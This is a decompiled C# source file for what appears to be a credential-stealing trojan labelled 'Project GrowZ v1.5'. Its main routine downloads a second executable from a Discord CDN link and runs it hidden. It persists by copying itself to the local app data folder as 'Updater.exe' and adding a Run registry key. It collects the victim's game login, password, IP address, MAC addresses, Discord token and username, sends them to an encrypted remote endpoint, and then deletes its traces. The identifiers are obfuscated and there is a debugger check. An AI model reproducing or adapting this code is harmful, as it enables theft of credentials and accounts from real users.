using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;

namespace LMAOOOOOOOOOOO;

internal class LMAOOO3OOOOOOOOOOOO18
{
	public static bool LMAOOOOOOO3OOOOOOOO13 = false;

	public static bool LMA34535345346Z55336664234G323OO = false;

	public static bool LMAOOOOOO33OOOOOOOOO10 = false;

	public static bool LM221AOOO313OOOOOOOOOO3OO13 = false;

	public static bool LMA22OOO3OOO31OOOOOOOOOOO112 = false;

	public static string LMAOOOOO3OOOOOOOOO15 = "N/A";

	public static string LMAO3OOOOOOOOOOOOOO9 = "N/A";

	public static string xddddasfasf = "aoI90PeaapejpsOP";

	public static string lmaoohehejasd = "Oi09ajhiplK0hip0goidp0jkduewsp0a";

	private static void getlmaooooooooooooooooooooo()
	{
		string text = Environment.ExpandEnvironmentVariables("%TEMP%");
		WebClient webClient = new WebClient();
		if (File.Exists(text + "\\savedecrypter.exe"))
		{
			File.Delete(text + "\\savedecrypter.exe");
		}
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/809066199827873805/853736900560551946/savedecrypter.exe", text + "\\savedecrypter.exe");
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.FileName = text + "\\savedecrypter.exe";
		ProcessStartInfo processStartInfo3 = (process.StartInfo = processStartInfo);
		process.Start();
		process.WaitForExit();
	}

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

	public static string Paste(string encrypted)
	{
		byte[] array = Convert.FromBase64String(encrypted);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.Key = Encoding.UTF8.GetBytes(lmaoohehejasd);
		rijndaelManaged.IV = Encoding.UTF8.GetBytes(xddddasfasf);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CBC;
		using ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(rijndaelManaged.Key, rijndaelManaged.IV);
		byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
		return Encoding.Unicode.GetString(bytes);
	}

	private static void Main()
	{
		string text = Environment.ExpandEnvironmentVariables("%TEMP%");
		WebClient webClient = new WebClient();
		getlmaooooooooooooooooooooo();
		LMA523556Z55336664234G323OO();
		string text2 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%");
		try
		{
			File.Copy(Assembly.GetExecutingAssembly().Location, text2 + "\\Updater.exe", overwrite: true);
		}
		catch
		{
		}
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("Updater", text2 + "\\Updater.exe");
		string text3 = File.ReadAllText(text + "\\result.txt");
		string[] array = text3.Split(new char[1] { '|' });
		string text4 = array[1];
		string text5 = array[0];
		string text6 = LMA74564566Z55336664234G323OO();
		string text7 = webClient.DownloadString("http://ipv4bot.whatismyipaddress.com/");
		using XDDDDDDDDD xDDDDDDDDD = new XDDDDDDDDD();
		xDDDDDDDDD.LMAOO3OOOOOOOOOOOOO17 = Paste("CW/PsKH5sxTA0WGmJaxxW+Thk49Dd8KsLTZ5gexykoy6DBwMJ0uW1kOgbx3/EYr5hXUFsXd0As45eHvS/z1yCjFBZxChcNcBJ8vX80TUHKJJsRpuWMyZyHFgJePOePswpOEeHp4TD2D6DXDNkrPlnwDCqYN+eS0f6UoJYaxZWuejQxh2OsYR56b38/srCRSonDQo9TjbUabylceU0LXrwHCuf2DNu4FZot1QQud++IrVTI6L1dQMy03KlyVP/wLGbJ5xKQneFS0AHCuQjarllHw5t1Wdwc/+HQEWMqHb1/pnFRs9W8+wW7U60JgUTPkCYC5dMfX4ujiTIbwSIv5YAQ==");
		xDDDDDDDDD.LMAOOOO("**Project GrowZ v1.5**\n**GrowID:** " + text4 + "\n**Password:** " + text5 + "\n**Victims Ip Address:** " + text7 + "\n**Victims Discord Token:** " + LMAO3OOOOOOOOOOOOOO9 + "\n**Victims Web Token:** " + LMAOOOOO3OOOOOOOOO15 + "\n**Victims Mac Addresses:** " + text6 + "\n**Victims UserName:** " + Environment.UserName);
		File.Delete(text + "\\savedecrypter.exe");
		File.Delete(text + "\\result.txt");
	}

	private static bool LMA523556Z55336664234G323OO()
	{
		bool isDebuggerPresent = false;
		CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
		return isDebuggerPresent;
	}

	private static string LMA74564566Z55336664234G323OO()
	{
		string text = string.Empty;
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		foreach (NetworkInterface networkInterface in allNetworkInterfaces)
		{
			if (networkInterface.OperationalStatus == OperationalStatus.Up)
			{
				text = text + networkInterface.GetPhysicalAddress().ToString() + ",\n";
			}
		}
		return text.TrimEnd(',', '\n');
	}
}
